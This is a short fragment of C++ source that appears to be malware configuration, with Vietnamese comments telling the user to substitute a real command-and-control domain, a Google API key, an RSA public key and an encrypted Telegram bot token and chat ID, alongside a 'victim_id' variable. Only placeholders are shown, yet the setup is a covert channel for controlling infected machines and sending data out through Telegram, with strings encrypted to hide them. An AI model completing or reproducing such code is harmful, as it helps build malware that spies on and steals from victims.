...
const string c2_base = "real domain server"; // Thay bằng domain C2 thực tế
const string google_key_url = "API key google"; // Thay bằng API key Google
const string fbk = R"(-----BEGIN PUBLIC KEY-----
RSA public key
-----END PUBLIC KEY-----)";
const string tkn = encrypt_string("bot token"); // Thay bằng Telegram bot token
const string cid = encrypt_string("chat id"); // Thay bằng Telegram chat ID
string victim_id;
